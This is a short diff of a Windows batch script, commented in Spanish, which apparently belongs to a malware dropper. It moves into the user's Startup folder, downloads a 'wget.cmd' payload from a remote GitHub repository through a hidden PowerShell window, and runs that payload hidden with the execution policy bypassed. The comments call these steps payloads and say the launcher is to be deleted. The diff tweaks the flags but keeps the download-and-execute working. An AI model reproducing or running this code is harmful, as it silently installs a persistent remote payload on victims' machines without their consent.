@@ -11,10 +11,10 @@ set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Pr
 cd  %STARTUP%
 
 @REM Ejecutar payloads al inicio.
-powershell powershell.exe -windowstyle hidden -ep bypass "Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/files/wget.cmd -OutFile wget.cmd"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/files/wget.cmd -OutFile wget.cmd"
 
 @REM Corriendo el payload
-powershell powershell.exe -windowstyle hidden -ep bypass ./wget.cmd
+powershell -windowstyle hidden -ep bypass ./wget.cmd
 
 @REM Borramos el iniciador
 @REM cd %INITIALPATH%
